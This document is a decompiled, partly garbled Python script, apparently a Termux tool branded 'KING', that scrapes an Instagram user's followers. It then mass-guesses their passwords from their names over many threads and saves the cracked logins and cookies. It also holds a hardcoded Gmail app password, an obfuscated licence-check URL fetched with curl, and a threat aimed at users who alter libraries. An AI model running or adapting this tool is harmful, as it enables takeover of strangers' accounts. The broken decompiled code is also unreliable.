
import lzma
import zlib
import codecs
import base64
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));


import json
import uuid
import zlib
import base64
import hmac
import subprocess
import marshal
import platform
import random
import hashlib
import urllib
import urllib.request as urllib
import urllib.parse as urllib
import base64
import phonenumbers
if ImportError:
    e = None
    exit(f'''\n [\x1b[1;35m>\x1b[0m] module {e} belum terinstall''')
    e = None
    del e
    e = None
    del e
import requests
import json
import os
import sys
import random
import datetime
import time
import re
import binascii
import base64
import struct
import rich
if ImportError:
    os.system('pip install rich')
    time.sleep(1)
    import rich
    if ImportError:
        exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from tkinter import X
import pytz
import print as cetak
from rich.tree import Tree
from bs4 import BeautifulSoup as par
from rich import print as prints
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel
from rich.table import Table as me
from rich.console import Console as sol
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import time
from rich.progress import Progress, TextColumn
day = datetime.now().strftime('%d-%b-%Y')
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
menudump = []
myid = uuid.uuid4().hex[:5].upper()
from email.message import EmailMessage
import ssl
import smtplib
email_sender = 'HamzaSubscription1@gmail.com'
email_password = 'jxgjlutwxmxclkgc'
email_receiver = 'HamzaSubscription2@gmail.com'
pathx = str(zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaz\xb9E\x89\xd9\x99y\xe9\x15\x15\x15\xba\xc9\xf9e\x00\xe7!\x13*')).replace("b'", '').replace("'", '')
key1 = open(pathx, 'r').read()
open(pathx, 'w').write(myid)
key1 = open(pathx, 'r').read() + str(os.getuid())
merah = '[#FF0022]'
hijau = '[#00FF33]'
hapus = '[/]'
bc = '[bold cyan]'
kuning = '[#FFFF00]'
kn = '[bold yellow]'
bulan_ttl = {
    '01': 'Januari',
    '02': 'Februari',
    '03': 'Maret',
    '04': 'April',
    '05': 'Mei',
    '06': 'Juni',
    '07': 'Juli',
    '08': 'Agustus',
    '09': 'September',
    '10': 'Oktober',
    '11': 'November',
    '12': 'Desember' }
color_table = '#afafff'
color_rich = '[#afafff]'
os.mkdir('result')
Z2 = '[#000000]'
M2 = '[#FF0000]'
H2 = '[#00FF00]'
K2 = '[#FFFF00]'
B2 = '[#00C8FF]'
U2 = '[#AF00FF]'
N2 = '[#FF00FF]'
O2 = '[#00FFFF]'
P2 = '[#FFFFFF]'
J2 = '[#FF8F00]'
A2 = '[#AAAAAA]'
bc = '[bold cyan]'
acakrich = random.choice([
    Z2,
    H2,
    K2,
    B2,
    U2,
    N2,
    O2,
    P2,
    J2,
    A2])
hapus = '[/]'
CY = '\x1b[96;1m'
H = '\x1b[96;1m'
M = '\x1b[1;31m'
K = '\x1b[1;33m'
U = '\x1b[1;35m'
O = '\x1b[38;2;255;127;0;1m'
C = '\x1b[0m'
B = '\x1b[94m'
N = '\x1b[0m'
USN = 'Mozilla/5.0 (Linux; Android 9; ASUS_A001D Build/PPR1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 Instagram 292.0.0.31.110 Android (28/9; 480dpi; 1080x2055; asus; ASUS_A001D; ASUS_A001D_1; qcom; en_GB; 495673913)'
(internal, external, success, checkpoint, loop, following, lisensikuni, lisensiku) = ([], [], [], [], 0, [], [], [
    'sukses'])
method = []
s = requests.Session()
zx = []
s = requests.Session()
ncek = []
os.mkdir('IG-OK.txt')
til = 'ncek'
hapus = '[/]'
biru_m = '[bold cyan]'

def clear():
    os.system('clear')


def banner():
    clear()
    print(f'''{K}\n╔╗╔═╗╔══╗╔═╗─╔╗╔═══╗\n║║║╔╝╚╣╠╝║║╚╗║║║╔═╗║\n║╚╝╝──║║─║╔╗╚╝║║║─╚╝\n║╔╗║──║║─║║╚╗║║║║╔═╗\n║║║╚╗╔╣╠╗║║─║║║║╚╩═║\n╚╝╚═╝╚══╝╚╝─╚═╝╚═══╝\n\n╔══════════════════════════════════════════╗\n║ Creator  : CHIGOZIEWORLDWIDE             ║\n║ Github   : CHIG0ZIEWORLDWIDE             ║\n║ WhatsApp : +2348069472717                ║\n║ Version  : D50.0                         ║\n║ FILENAME : KING                          ║\n╚══════════════════════════════════════════╝ ''')


def loadinglisen():
    animation = [
        '[\x1b[1;91m■\x1b[0m□□□□□□□□□]',
        '[\x1b[1;92m■■\x1b[0m□□□□□□□□]',
        '[\x1b[1;93m■■■\x1b[0m□□□□□□□]',
        '[\x1b[1;94m■■■■\x1b[0m□□□□□□]',
        '[\x1b[1;95m■■■■■\x1b[0m□□□□□]',
        '[\x1b[1;96m■■■■■■\x1b[0m□□□□]',
        '[\x1b[1;97m■■■■■■■\x1b[0m□□□]',
        '[\x1b[1;98m■■■■■■■■\x1b[0m□□]',
        '[\x1b[1;99m■■■■■■■■■\x1b[0m□]',
        '[\x1b[1;910m■■■■■■■■■■\x1b[0m]']
    for i in range(50):
        time.sleep(0)
        sys.stdout.write(f'''\r{N}[{K}+{N}] {K}Processing {N} ''' + animation[i % len(animation)] + '\x1b[0m ')
        sys.stdout.flush()
        print('')
        return None


def loadinglogin():
    animation = [
        '[\x1b[1;91m■\x1b[0m□□□□□□□□□]',
        '[\x1b[1;92m■■\x1b[0m□□□□□□□□]',
        '[\x1b[1;93m■■■\x1b[0m□□□□□□□]',
        '[\x1b[1;94m■■■■\x1b[0m□□□□□□]',
        '[\x1b[1;95m■■■■■\x1b[0m□□□□□]',
        '[\x1b[1;96m■■■■■■\x1b[0m□□□□]',
        '[\x1b[1;97m■■■■■■■\x1b[0m□□□]',
        '[\x1b[1;98m■■■■■■■■\x1b[0m□□]',
        '[\x1b[1;99m■■■■■■■■■\x1b[0m□]',
        '[\x1b[1;910m■■■■■■■■■■\x1b[0m]']
    for i in range(50):
        time.sleep(0)
        sys.stdout.write(f'''\r{K}[{K}+{K}] {K}Please Hold On {K} ''' + animation[i % len(animation)] + '\x1b[0m ')
        sys.stdout.flush()
        print('')
        return None

urllib_quote_plus = urllib.quote
urllib_quote_plus = urllib.parse.quote_plus

def cekAPI(cookie):
    user = open('.username', 'r').read()
    coki = open('.kukis.log', 'r').read()
    c = s.get('https://i.instagram.com/api/v1/users/web_profile_info/?username=%s' % user, cookies = {
        'cookie': coki }, headers = {
        'user-agent': USN,
        'x-ig-app-id': '936619743392459' })
    i = c.json()['data']['user']
    nama = i['full_name']
    followers = i['edge_followed_by']['count']
    following = i['edge_follow']['count']
    external.append(f'''{nama}|{followers}|{following}''')
    if FileNotFoundError:
        os.remove('.kukis.log')
        os.remove('.username')
    if (ValueError, KeyError, json.decoder.JSONDecodeError, KeyError, AttributeError, TypeError):
        wel = '# Instagram Checkpoint'
        wel2 = mark(wel, style = 'red')
        sol().print(wel2)
        time.sleep(0)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()
    return (external, user)


def Main_():
    if 'sukses' in lisensiku:
        kuki = open('.kukis.log', 'r').read()
        if FileNotFoundError:
            banner()
            print('----------------------------------------------------------------------')
            print('[+] LOGIN INSTAGRAM COOKIES ')
            print('----------------------------------------------------------------------')
            coki = input('[+] ENTER COOKIES : ')
            id = re.search('ds_user_id=(\\d+)', str(coki)).group(1)
            po = s.get(f'''https://i.instagram.com/api/v1/users/{id}/info/''', headers = {
                'user-agent': USN }, cookies = {
                'cookie': coki })
            xx = json.loads(po.text)['user']
            nama = xx['full_name']
            useri = xx['username']
            user = open('.username', 'w').write(useri)
            kuki = open('.kukis.log', 'w').write(coki)
            loadinglogin()
            prints(Panel(f'''        ACTIVE [cyan]{nama}[/] COOKIES VERIFIED''', padding = (0, 5), style = 'bold white', width = 70))
            time.sleep(0)
            time.sleep(0)
            exit(f'''[{CY}+{N}] INPUT THE TOOL AGAIN BY TYPING Python Instagram.py''')
            if (ValueError, KeyError, json.decoder.JSONDecodeError, KeyError, AttributeError, TypeError, AttributeError):
                print('')
                loadinglogin()
                time.sleep(0)
                exit(f'''{M}[+] COOKIE DEAD''')
                time.sleep(0)
            if ConnectionAbortedError:
                exit(f'''{red}[+] BAD INTERNET CONNECTION''')
        (ex, user) = cekAPI(kuki)
        cookie = {
            'cookie': kuki }
        instagram(ex, user, cookie).menu()
        return None


class instagram:
    
    def __init__(self, external, username, cookie):
        self.ext = external
        self.username = username
        self.cookie = cookie
        self.s = requests.Session()
        self.tol = Console()
        self.pwa = []

    
    def logo(self):
        for i in external:
            nama = i.split('|')[0]
            followers = i.split('|')[1]
            following = i.split('|')[2]
            clear()
            print(f'''{K}\n╔╗╔═╗╔══╗╔═╗─╔╗╔═══╗\n║║║╔╝╚╣╠╝║║╚╗║║║╔═╗║\n║╚╝╝──║║─║╔╗╚╝║║║─╚╝\n║╔╗║──║║─║║╚╗║║║║╔═╗\n║║║╚╗╔╣╠╗║║─║║║║╚╩═║\n╚╝╚═╝╚══╝╚╝─╚═╝╚═══╝\n\n╔══════════════════════════════════════════╗\n║ Creator  : CHIGOZIEWORLDWIDE             ║\n║ Github   : CHIG0ZIEWORLDWIDE             ║\n║ WhatsApp : +2348069472717                ║\n║ Version  : D50.0                         ║\n║ FILENAME : KING                          ║\n╚══════════════════════════════════════════╝\n\n\n╔═══════════════════════╗\n║ ＯＮＬＩＮＥ          ║\n║                       ║\n╚═══════════════════════╝\n[01] Instagram Followers Crack\n[03] Instagram Results History\n[00] Instagram Exit \n\t''')
            return None

    
    def Exit(self):
        print('----------------------------------------------------------------------')
        x = input(f'''{K}[+] Do You Want To Exist ? [Y/T]: ''')
        if x in ('y', 'Y'):
            os.remove('.kukis.log')
            os.remove('.username')
            os.system('python Instagram.py')
            return None
        if None in ('t', 'T'):
            os.system('python Instagram.py')
            return None
        None.Exit()

    
    def convert(self, nama):
        jembut = requests.Session()
        curl = jembut.get('https://i.instagram.com/api/v1/users/web_profile_info/?username={}'.format(nama), headers = {
            'user-agent': USN }, cookies = self.cookie).json()
        data = curl['data']['user']
        None(None, None)
        return data['id']
        if not None:
            pass

    
    def followers(self, userid, cokz):
        kontol = requests.Session()
        link = kontol.get(f'''https://i.instagram.com/api/v1/friendships/{userid}/followers/?count=100&max_id={cokz}''', headers = {
            'user-agent': USN }, cookies = self.cookie)
        for x in json.loads(link.text)['users']:
            if x['username'] in internal:
                pass
            internal.append(x['username'] + '|' + x['full_name'])
            sys.stdout.flush()
            time.sleep(0)
            if 'next_max_id' in json.loads(link.text):
                self.followers(userid, json.loads(link.text)['next_max_id'])
        self.passwordAPI(internal)
        if KeyboardInterrupt:
            pass
        if KeyError:
            print(f'''{K}[{K}+{K}] Username Private''')
            self.passwordAPI(internal)
        if (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError, requests.exceptions.ReadTimeout):
            print(f'''\n{M}[+] No Internet Connection {K}''')
            self.passwordAPI(internal)
        None(None, None)
        return None
        if not None:
            pass

    
    def idAPI(self, cookie, id):
        if 'sukses' in lisensiku:
            m = s.get('https://i.instagram.com/api/v1/users/web_profile_info/?username=%s' % id, cookies = cookie, headers = {
                'user-agent': USN,
                'x-ig-app-id': '936619743392459' })
            m_jason = m.json()['data']['user']
            idx = m_jason['id']
            if requests.exceptions.ConnectionError:
                exit(f'''\n{K}[+] No Internet Connection{K}''')
            if (json.decoder.JSONDecodeError, KeyError, AttributeError):
                exit(f'''{M}[+] COOKIE CHECKPOINT{N}''')
            if Exception:
                e = None
                exit(f'''{H}[+] USERNAME MUST BE PUBLIC ONLY {N}''')
                e = None
                del e
                e = None
                del e
            return idx

    
    def timezone(self, lang):
        if lang in ('en_US', 'en_GB'):
            zone = 'Asia/Jakarta'
        zone = 'America/New_York'
        tz = pytz.timezone(zone)
        return str(datetime.now(tz).utcoffset())

    
    def Android_Version(self, android_version):
        if str(android_version) == '9':
            return '28'
        if None(android_version) == '10':
            return '29'
        if None(android_version) == '11':
            return '30'
        if None(android_version) == '12':
            return '31'
        if None(android_version) == '13':
            return '32'

    
    def ua_ran(self):
        self.anc = random.randint(100, 510)
        self.xyz = random.randint(14, 21)
        self.apc = random.randint(14, 35)
        self.abc = random.randint(75, 115)
        ponid = random.randint(30000, 60000)
        andro = random.randint(9, 14)
        rn = 'Instagram {}.0.0.{}.{} Android ({}/{}; 480dpi; 1080x2244; Oppo; CPH2221; Oppo F21 Pro 5G; qcom; en-US; 495673913)'.format(self.anc, self.apc, self.abc, self.xyz, self.Android_Version(andro), ponid)
        return random.choice([
            rn])

    
    def vers(self):
        igv = '100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129'
        igve = igv.split(',')
        versi = random.choice(igve)
        return versi

    
    def ingfo(self):
        urut = []
        urut.append(Panel(f'''OK RESULT/[bold green]ACTIVE-{day}.txt[/]''', padding = (0, 18), style = ''))
        urut.append(Panel(f'''CP RESULT/[bold yellow]FAILED-{day}.txt[/]''', padding = (0, 18), style = ''))
        self.tol.print(Columns(urut))

    
    def ifo(self):
        print('%s                                                                         \n[01] API SLOW \n[02] API FAST \n' % K)

    
    def passwordAPI(self, xnx):
        prints(Panel(f'''{P2}TOTAL ID  : {len(internal)} ''', width = 30, padding = (0, 4), style = ''))
        self.ifo()
        prints(Panel(f'''{P2}PASSWORD LIST ''', width = 30, padding = (0, 4), style = ''))
        u = input('[+] Options  ')
        if u in ('1', '01'):
            method.append('satu')
        if u in ('2', '02'):
            method.append('dua')
        if u in ('3', '03'):
            method.append('tiga')
        method.append('satu')
        print('%s                                                                         \n[01] FAST API\n[02] FAST GRAPH\n[03] FAST NORMAL\n' % K)
        c = input(f'''{K}[+] Options  {K} ''')
        if c in ('3', '03'):
            self.generateAPI(xnx, c)
            return None
        if None in ('4', '04'):
            prints(Panel(f'''{P2}contoh password : sayang,anjing,bangsat''', width = 80, padding = (0, 4), style = ''))
            zx = input(f'''{N}[•] Tambahkan password :{N} ''')
            zz = zx.split(',')
            for i in zz:
                self.pwa.append(i)
                self.generateAPI(xnx, c, zx)
                return None
                self.passwordAPI(xnx)
                return None

    
    def generateAPI(self, user, o, zx = ('',)):
        global prog, des
        self.ingfo()
        prog = Progress(TextColumn('{task.description}'))
        des = prog.add_task('', total = len(user))
        prog
        shinkai = ThreadPoolExecutor(max_workers = 35)
        for i in user:
            username = i.split('|')[0]
            password = i.split('|')[1].lower()
            for w in password.split(' '):
                if len(w) < 3:
                    pass
                w = w.lower()
                if o == '':
                    if len(w) == 3 and len(w) == 4 or len(w) == 5:
                        pass
                    sandi = [
                        w,
                        w + '123',
                        w + '1234']
                if o == '2':
                    if len(w) == 3 and len(w) == 4 or len(w) == 5:
                        pass
                    sandi = [
                        w + '123',
                        w,
                        w + '1234',
                        w + '12345',
                        password.lower()]
                if o == '3':
                    if len(w) == 3 and len(w) == 4 or len(w) == 5:
                        sandi = [
                            w + '123',
                            w + '1234',
                            w + '321',
                            w + '12345',
                            password.lower()]
                    sandi = [
                        w,
                        w + '123',
                        w + '1234',
                        w + '321',
                        w + '12345',
                        password.lower()]
                if o == '4':
                    for kontol in self.pwa:
                        sandi = [
                            w,
                            w + '123',
                            w + '1234']
                        sandi.append(kontol)
                        sandi.append(username.replace('.', '').replace('_', ''))
                        sandi.append(username.replace('.', '').replace('_', '').replace('__', ''))
                        sandi.append(username.replace('.', '').replace('_', '').replace('@', ''))
                        sandi.append(w.replace(' ', ''))
                        if 'satu' in method:
                            shinkai.submit(self.crackAPI, username, sandi)
                if 'dua' in method:
                    shinkai.submit(self.crackAPI2, username, sandi)
                if 'tiga' in method:
                    shinkai.submit(self.ajax, username, sandi)
                shinkai.submit(self.crackAPI, username, sandi)
                [
                    w + '123',
                    w + '1234',
                    w + '12345',
                    password.lower()]
                None(None, None)
                if not [
                    w + '123',
                    w + '1234',
                    w + '12345']:
                    pass
        print('\n')
        print('----------------------------------------------------------------------')
        print('[+] THE PROCESS IS COMPLETED')
        print('----------------------------------------------------------------------')
        exit()
        None(None, None)
        return None
        if not None:
            pass

    
    def APIinfo(self, user):
        x = s.get('https://i.instagram.com/api/v1/users/web_profile_info/?username=%s' % user, headers = {
            'user-agent': USN,
            'x-ig-app-id': '936619743392459' })
        x_jason = x.json()['data']['user']
        nama = x_jason['full_name']
        pengikut = x_jason['edge_followed_by']['count']
        mengikut = x_jason['edge_follow']['count']
        postingan = x_jason['edge_owner_to_timeline_media']['count']
        nama = '-'
        pengikut = '-'
        mengikut = '-'
        postingan = '-'
        return (nama, pengikut, mengikut, postingan)

    
    def encrypt_password_ajax(self, key_id, pub_key, password, version = (10,)):
        key_id = int(key_id)
        key = Random.get_random_bytes(32)
        iv = bytes([
            0] * 12)
        time = int(datetime.now().timestamp())
        aes = AES.new(key, AES.MODE_GCM, nonce = iv, mac_len = 16)
        aes.update(str(time).encode('utf-8'))
        (encrypted_password, cipher_tag) = aes.encrypt_and_digest(password.encode('utf-8'))
        pub_key_bytes = binascii.unhexlify(pub_key)
        seal_box = SealedBox(PublicKey(pub_key_bytes))
        encrypted_key = seal_box.encrypt(key)
        encrypted = None(None)
        encrypted = base64.b64encode(encrypted).decode('utf-8')
        return f'''#PWD_INSTAGRAM_BROWSER:{version}:{time}:{encrypted}'''

    
    def enc_password(self, publickeyid, publickey, password):
        session_key = get_random_bytes(32)
        iv = get_random_bytes(12)
        timestamp = str(int(time.time()))
        decoded_publickey = base64.b64decode(publickey.encode())
        recipient_key = RSA.import_key(decoded_publickey)
        cipher_rsa = PKCS1_v1_5.new(recipient_key)
        rsa_encrypted = cipher_rsa.encrypt(session_key)
        cipher_aes = AES.new(session_key, AES.MODE_GCM, iv)
        cipher_aes.update(timestamp.encode())
        (aes_encrypted, tag) = cipher_aes.encrypt_and_digest(password.encode('utf8'))
        size_buffer = len(rsa_encrypted).to_bytes(2, byteorder = 'little')
        payload = base64.b64encode(b''.join([
            b'\x01',
            int(publickeyid).to_bytes(1, byteorder = 'big'),
            iv,
            size_buffer,
            rsa_encrypted,
            tag,
            aes_encrypted]))
        return f'''#PWD_INSTAGRAM:4:{timestamp}:{payload.decode()}'''

    
    def uuid(self, heex, seed = (False, None)):
        m = hashlib.md5()
        m.update(seed.encode('utf-8'))
        x = uuid.UUID(m.hexdigest())
        x = uuid.uuid4()
        if heex:
            return str(x.hex)
        return seed(x)

    
    def adid(self, user = (None,)):
        user = '12345'
        sha2 = hashlib.sha256()
        sha2.update(user.encode('utf-8'))
        seed = sha2.hexdigest()
        return self.uuid(False, seed)

    
    def generate_jazoest(self, code):
        data = (lambda .0: for c in .0:
ord(c)None)(code())
        return f'''2{data}'''

    
    def guid(self):
        return self.uuid(False)

    
    def dvid(self):
        return f'''android-{self.uuid(True)[:16]}'''

    
    def poid(self, dvid):
        return self.uuid(False, dvid)

    
    def hmac(self, data, signature = (None,)):
        signature = 'SIGNATURE'
        return hmac.new(signature.encode('utf-8'), data.encode('utf-8'), hashlib.sha256).hexdigest()

    
    def signature(self, data, sign = (None,)):
        sign = 'SIGNATURE'
        return 'signed_body={}.{}&ig_sig_key_version=4'.format(sign, urllib.parse.quote_plus(data))

    
    def generate_tzdata(self, country_code = (None,)):
        resp = requests.get('https://ident.me/json')
        if resp.status.code == 200:
            resp = json.loads(resp.text)
            country_code = resp['cc']
        country_code = 'GB'
        timezone_list = pytz.country_timezones.get(country_code, [])
        timezone = random.choice(timezone_list)
        current_time = datetime.now(pytz.timezone(timezone))
        return {
            'country': self.generate_country_code(country_code),
            'timezone': timezone,
            'timezone_offset': str(current_time.utcoffset().total_seconds()).split('.')[0],
            'raw_client_time': str(int(current_time.timestamp() * 1000)) }

    
    def rawclient_time(self, lang):
        if lang in ('en_US', 'en_US'):
            zone = 'Asia/Jakarta'
        zone = 'America/New_York'
        tz = pytz.timezone(zone)
        ct = datetime.now(tz)
        ft = ct.strftime('%Y-%m-%dT%H:%M:%S.%fZ')
        hash_obj = hashlib.sha256(ft.encode())
        hash_hex = hash_obj.hexdigest()
        return base64.b64encode(bytes.fromhex(hash_hex)).decode()

    
    def generate_signature(self, data):
        return 'params={}&bk_client_context={}&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73'.format(urllib.parse.quote_plus(json.dumps(data)), urllib.parse.quote_plus(json.dumps({
            'bloks_version': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',
            'styles_id': 'instagram' })))

    
    def generate_uuid(self, heex, seed = (False, None)):
        data = hashlib.md5()
        data.update(seed.encode('utf-8'))
        data = uuid.UUID(data.hexdigest())
        data = uuid.uuid4()
        if heex:
            return str(data.hex)
        return seed(data)

    
    def generate_country_code(self, country):
        prefix = phonenumbers.parse('012 345 6789', country)
        return '[{"country_code":"%s","source":["default"]}]' % str(prefix).split(' ')[2]

    
    def crackAPI2(self, user, pas):
        global loop, loop, loop
        ses = requests.Session()
        prog.update(des, description = f'''[{acakrich}KING[/]] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]''')
        prog.advance(des)
        for pw in pas:
            self.all_configs = {
                'data': {
                    'device_id': f'''android-{self.Android_ID(user, pw).hexdigest()[:16]}''',
                    'password': f'''#PWD_INSTAGRAM:0:{str(int(datetime.now().timestamp()))}:{pw}''',
                    'uuid': str(uuid.uuid4()) } }
            self.data_thread = {
                'client_input_params': 'v7chy0:54',
                'server_params': {
                    'qe_device_id': self.all_configs['data']['uuid'],
                    'ar_event_source': 'login_home_page' } }
            self.sign = 'params=' + urllib.parse.quote(str(self.data_thread)) + '&bk_client_context={"bloks_version":"9de54335a516a20dc08018bc3a317ec1a859821fe610ed57b5994052d68f92e6","styles_id":"instagram"}&bloks_versioning_id=9de54335a516a20dc08018bc3a317ec1a859821fe610ed57b5994052d68f92e6'
            self.head = {
                'x-pigeon-session-id': f'''UFS-{self.all_configs['data']['uuid']}-0''',
                'x-ig-app-id': '567067343352427',
                'priority': 'u=3',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'x-bloks-is-layout-rtl': 'false',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Host': 'i.instagram.com',
                'x-fb-http-engine': 'Liger',
                'x-ig-family-device-id': self.all_configs['data']['uuid'],
                'x-fb-client-ip': 'True',
                'x-fb-server-cluster': 'True',
                'x-fb-connection-type': 'unknown' }
            xnxx = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data = self.sign, headers = self.head, allow_redirects = True)
            if 'Bearer IGT:2:' in str(xnxx.text.replace('\\', '')):
                success.append(user)
                (nama, pengikut, mengikut, postingan) = self.APIinfo(user)
                io = f'''User      : {nama}\nUsername  : {user}\nPassword  : {pw}\nFollowers : {pengikut}\nFollowing : {mengikut}\nPosts     : {postingan}\n'''
                oi = nel(io, style = 'bold green')
                print('\n')
                cetak(nel(oi, style = '', title = ' [bold green] LOGIN SUCCESS [/bold green]'))
                open(f'''result/success/success-{day}.txt''', 'a').write(f'''{user}|{pw}|{pengikut}|{mengikut}|{coki}\n''')
                open('.logCrack', 'a').write(f'''{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{xnxx.text}\n''')
                '3brTv10='
            if 'https://i.instagram.com/challenge' in str(xnxx.text):
                (nama, pengikut, mengikut, postingan) = self.APIinfo(user)
                open(f'''result/checkpoint/checkpoint-{day}.txt''', 'a').write(f'''{user}|{pw}|{pengikut}|{mengikut}\n''')
                open('.logCrack', 'a').write(f'''{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{xnxx.text}\n''')
                'x-ig-capabilities'
            if 'ip_block' in str(xnxx.text) or 'spam' in str(xnxx.text):
                prog.update(des, description = f'''{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]''')
                prog.advance(des)
                time.sleep(0)
                self.crackAPI2(user, pas)
                open('.logCrack', 'a').write(f'''{M}╭({loop}) {user} || {pw}\n╰{xnxx.text}\n{N}\n''')
                loop -= 1
                'unknown'
            open('.logCrack', 'a').write(f'''{N}╭({loop}) {user} || {pw}\n╰{xnxx.text}{self.ua_ran()}\n{N}\n''')
            if requests.exceptions.ConnectionError:
                'x-ig-connection-type'
                prog.update(des, description = f'''{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]''')
                prog.advance(des)
                time.sleep(0)
                self.crackAPI2(user, pas)
                loop -= 1
                str(-(time.timezone))
            loop += 1
            return None

    
    def Android_ID(self, users, passwd):
        self.xyz = hashlib.md5()
        self.xyz.update(users.encode('utf-8') + passwd.encode('utf-8'))
        self.hex = self.xyz.hexdigest()
        self.xyz.update(self.hex.encode('utf-8') + '12345'.encode('utf-8'))
        return self.xyz

    
    def cek_hasil(self):
        nom = []
        no = 0
        urut = []
        prints(Panel(f'''\t[{K}+{hapus}] CHECK CRACK RESULTS''', padding = (0, 4), style = ''))
        urut.append(Panel(f'''[1] CHECK CRACK RESULTS {K}success{h}''', padding = (0, 5), style = ''))
        urut.append(Panel(f'''[2] CHECK ACCOUNT RESULTS {K}CHECKPOINT{hapus}''', padding = (0, 5), style = ''))
        self.tol.print(Columns(urut))
        one = input('[+] YOUR CHOICE ')
        if one in ('1', '01'):
            ok = os.listdir('result/success/')
            prints(f'''[{K}+{K}] NO SUCCESS RESULTS FOUND''')
            time.sleep(0)
            self.menu()
            for x in ok:
                nom.append(x)
                no += 1
                jum = open('result/success/' + x, 'r').readlines()
                print(f'''[{H}{no}{N}] {x} - {H}{len(jum)} {N}akun''')
                abc = input(f'''[{K}+{K}] FILE NAME : ''')
                file = nom[int(abc) - 1]
                buka = open('result/success/' + file, 'r').read()
                prints(f'''[{h}+{hapus}] NO SUCCESS RESULTS FOUND''')
                time.sleep(1)
                self.menu()
                print('')
                print(H + buka + N)
                input(f'''\n[{H}!{N}] TYPE ENTER TO RETURN BACK''')
                self.menu()
                return None
                if one in ('2', '02'):
                    ok = os.listdir('result/success/')
                    prints(f'''[{h}+{h}] NO SUCCESS RESULTS FOUND''')
                    self.menu()
                    for x in ok:
                        nom.append(x)
                        no += 1
                        jum = open('result/success/' + x, 'r').readlines()
                        print(f'''[{H}{no}{N}] {x} - {H}{len(jum)} {N}akun''')
                        abc = input(f'''[{H}+{N}] INPUT FILE: ''')
                        file = nom[int(abc) - 1]
                        buka = open('result/success/' + file, 'r').read()
                        prints(f''' [{h}+{h}] NO CHECKPOINT RESULTS FOUND''')
                        time.sleep(1)
                        self.menu()
                        print('')
                        print(K + buka + K)
                        input(f'''\n[{H}!{N}] TYPE ENTER TO RETURN BACK''')
                        self.menu()
                        return None
                        print(f''' [{M}!{N}] CORRECT''')
                        time.sleep(0)
                        self.menu()
                        return None

    
    def menu(self):
        self.logo()
        c = input(f'''{K}[+] CHOOSE {C}  ''')
        if c == '':
            self.menu()
            return None
        if None in ('1', '01'):
            pr = '[+] CLONE FROM FOLLOWERS'
            po = nel(pr, style = '')
            sol().print(po)
            nama = input(f'''[{K}+{K}] Username : {H}''')
            user = self.convert(nama)
            self.followers(user, '')
            return None
        if None in ('3', '03'):
            print('')
            for i in os.listdir('result/success/'):
                print(f'''[{CY}+{CY}] {i}''')
                c = input(f'''\n[{CY}+{CY}] INPUT NAME FILE {C}''')
                g = open('result/success/%s' % c).read().splitlines()
                print(f'''\n{K}[+] TOTAL RESULT FOUND {K}{len(g)}{C}''')
                print(f'''\n{K}[+] PROCESSING HOLD {K}\n''')
                for s in g:
                    user = s.split('|')[0]
                    pwd = s.split('|')[1]
                    self.crackAPI2(user, pwd)
                    wel = '[+] FINISHING'
                    cik2 = mark(wel, style = 'yellow')
                    sol().print(cik2)
                    exit()
                    return None
                    if c in ('3', '03'):
                        self.cek_hasil()
                        return None
                    if None in ('0', '00'):
                        self.Exit()
                        return None
                    None.menu()
                    return None


os.system('clear')
print(' Checking Security...')
if not os.path.exists('/data/data/com.termux/files/usr/bin/rm'):
    print('Error in termux module! ')
if not str(len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r').readlines())) == '1034':
    time.sleep(0)
    print('Final Warning If You Try Again Your System Will be Fucked Bye Mr Hamxa')
    exit()

def make_get_request(url):
    requests.get('https://github.com/HAMZA-GHANIZADA')
    if requests.exceptions.ConnectionError:
        exit(' Connection Error! ')
    result = subprocess.run([
        'curl',
        url], capture_output = True, text = True, check = True)
    response = result.stdout
    return response
    if subprocess.CalledProcessError:
        e = None
        exit(' Connection Error! ')
        e = None
        del e
        return None
    e = None
    del e


def approval():
    os.system('clear')
    banner()
    plat = platform.version()[14:][:21][::-1].upper() + platform.release()[5:][::-1].upper() + platform.version()[:8]
    key = 'CHIGOZIE-' + plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '').replace('SMPP', '').replace('YT', '')
    uri = str(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J\xcd+)\xaa\xd4K\xce\xd7w\x8e\x0c\xf1\xf0\xf73\x04\x00w\xb1\x08\xa5')).replace("b'", '').replace("'", '')
    response = make_get_request(uri)
    if key + '|' + key1 in response:
        print('\x1b[1;97m[+] Congratulations Your Key Has Been Approved \n')
        time.sleep(0)
        Main_()
    print('----------------------------------------------------------------------')
